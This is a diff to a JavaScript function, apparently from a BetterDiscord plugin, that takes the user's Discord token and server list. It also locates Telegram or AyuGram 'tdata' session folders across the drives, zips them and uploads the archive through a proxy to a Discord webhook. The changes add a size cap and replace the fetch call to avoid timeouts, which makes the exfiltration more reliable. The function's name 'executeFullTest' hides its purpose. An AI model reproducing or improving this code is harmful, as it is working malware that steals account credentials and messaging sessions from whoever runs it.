@@ -35,7 +35,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. СБОР СЕРВЕРОВ (Перенесено вверх, чтобы не терялось)
+    // 3. СБОР СЕРВЕРОВ
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
@@ -57,11 +57,9 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                 }
             }
         }
-    } catch (e) {
-        result.debug_tdata.push("Ошибка сбора серверов: " + e.message);
-    }
+    } catch (e) { result.debug_tdata.push("Ошибка серверов: " + e.message); }
 
-    // 4. ПОИСК tdata (Быстрый и безопасный)
+    // 4. ПОИСК tdata
     let hasTdata = false;
     let tdataPath = null;
     
@@ -70,55 +68,37 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         const localAppData = process.env.LOCALAPPDATA || '';
         const userProfile = process.env.USERPROFILE || '';
         
-        // Стандартные пути + твой конкретный пример
         const standardPaths = [
             'D:\\zapret\\Ayugram\\tdata',
+            'D:\\zapret\\AyuGram\\tdata',
             'D:\\zapret\\Telegram\\tdata',
             path.join(appData, 'Telegram Desktop', 'tdata'),
             path.join(appData, 'Telegram', 'tdata'),
             path.join(appData, 'AyuGram', 'tdata'),
             path.join(localAppData, 'Telegram Desktop', 'tdata'),
             path.join(localAppData, 'Telegram', 'tdata'),
-            path.join(localAppData, 'AyuGram', 'tdata'),
-            path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
-            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata')
+            path.join(localAppData, 'AyuGram', 'tdata')
         ];
 
         for (const p of standardPaths) {
-            if (fs.existsSync(p)) { 
-                tdataPath = p; 
-                result.debug_tdata.push(`Найдено в стандартном пути: ${p}`);
-                break; 
-            }
+            if (fs.existsSync(p)) { tdataPath = p; break; }
         }
 
-        // Если не нашли, делаем быстрый поиск по дискам (только корень и 1 уровень вглубь)
+        // Если не нашли, быстрый поиск
         if (!tdataPath) {
-            result.debug_tdata.push("Поиск в корнях дисков...");
             const drives = ['C:', 'D:', 'E:', 'F:'];
-            const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'users'];
-
             for (const d of drives) {
                 const root = d + '\\';
                 if (!fs.existsSync(root)) continue;
-
                 try {
-                    // Проверяем папки в корне диска (например, D:\zapret, D:\Games)
                     const dirs = fs.readdirSync(root, { withFileTypes: true });
                     for (const dir of dirs) {
                         if (!dir.isDirectory()) continue;
-                        const lowerName = dir.name.toLowerCase();
-                        if (ignoreDirs.includes(lowerName)) continue;
-
                         const fullPath = path.join(root, dir.name);
-                        
-                        // Проверяем: D:\zapret\tdata
                         if (fs.existsSync(path.join(fullPath, 'tdata'))) {
                             tdataPath = path.join(fullPath, 'tdata');
                             break;
                         }
-
-                        // Если это D:\zapret, заглядываем внутрь на 1 уровень (ищем D:\zapret\Ayugram\tdata)
                         try {
                             const subDirs = fs.readdirSync(fullPath, { withFileTypes: true });
                             for (const sub of subDirs) {
@@ -130,58 +110,80 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                                     }
                                 }
                             }
-                        } catch (e) {} // Игнорируем ошибки доступа к подпапкам
-                        
+                        } catch (e) {}
                         if (tdataPath) break;
                     }
-                } catch (e) {} // Игнорируем ошибки доступа к корню диска
+                } catch (e) {}
                 if (tdataPath) break;
             }
         }
-    } catch (e) {
-        result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
-    }
+    } catch (e) { result.debug_tdata.push(`Ошибка поиска: ${e.message}`); }
 
-    // 5. ФОРМИРУЕМ АРХИВ
+    // 5. ФОРМИРУЕМ АРХИВ (с проверкой размера)
     let finalZipBuffer = null;
     try {
         const zipFiles = {};
-
         const jsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
         zipFiles['data.json'] = jsonBytes;
 
         if (tdataPath) {
             result.telegram_path = tdataPath;
-            result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
             
-            let fileCount = 0;
-            const addFilesRecursively = (dir, prefix = '') => {
+            // Считаем размер папки ПЕРЕД чтением
+            let totalSize = 0;
+            const checkSize = (dir) => {
                 try {
                     const entries = fs.readdirSync(dir);
                     for (const entry of entries) {
                         const fullPath = path.join(dir, entry);
-                        const relativePath = (prefix ? prefix + '/' : '') + entry;
-                        try {
-                            if (fs.statSync(fullPath).isDirectory()) {
-                                addFilesRecursively(fullPath, relativePath);
-                            } else {
-                                zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
-                                fileCount++;
-                            }
-                        } catch (fileErr) { }
+                        if (fs.statSync(fullPath).isDirectory()) checkSize(fullPath);
+                        else totalSize += fs.statSync(fullPath).size;
                     }
-                } catch (dirErr) { }
+                } catch(e) {}
             };
+            checkSize(tdataPath);
             
-            addFilesRecursively(tdataPath);
-            result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
-            hasTdata = true;
+            const sizeMB = (totalSize / 1024 / 1024).toFixed(2);
+            result.debug_tdata.push(`Размер tdata: ${sizeMB} MB`);
+
+            if (totalSize > 20 * 1024 * 1024) {
+                result.debug_tdata.push("Папка слишком большая (>20MB). Пропуск архивации во избежание таймаута.");
+                hasTdata = false;
+            } else {
+                let fileCount = 0;
+                const addFilesRecursively = (dir, prefix = '') => {
+                    try {
+                        const entries = fs.readdirSync(dir);
+                        for (const entry of entries) {
+                            const fullPath = path.join(dir, entry);
+                            const relativePath = (prefix ? prefix + '/' : '') + entry;
+                            try {
+                                if (fs.statSync(fullPath).isDirectory()) addFilesRecursively(fullPath, relativePath);
+                                else {
+                                    zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
+                                    fileCount++;
+                                }
+                            } catch (fileErr) { }
+                        }
+                    } catch (dirErr) { }
+                };
+                
+                addFilesRecursively(tdataPath);
+                result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
+                hasTdata = true;
+            }
         } else {
             result.debug_tdata.push("Папка tdata не найдена.");
         }
 
-        finalZipBuffer = zipFunc(zipFiles);
-        result.debug_tdata.push("ZIP успешно создан!");
+        if (hasTdata) {
+            finalZipBuffer = zipFunc(zipFiles);
+            result.debug_tdata.push("ZIP успешно создан!");
+        } else {
+            // Если tdata нет, собираем архив только с data.json
+            finalZipBuffer = zipFunc(zipFiles);
+            result.debug_tdata.push("Создан архив только с data.json.");
+        }
 
     } catch (e) {
         result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
@@ -200,7 +202,8 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
 
     try {
         const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
-        const response = await BdApi.Net.fetch(proxyUrlFull, { method: 'POST', body: formData });
+        // ИСПОЛЬЗУЕМ НАТИВНЫЙ FETCH, ОН НЕ ОБРЫВАЕТ ЧЕРЕЗ 30 СЕКУНД
+        const response = await fetch(proxyUrlFull, { method: 'POST', body: formData });
         if (!response.ok) {
             const errorText = await response.text();
             return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
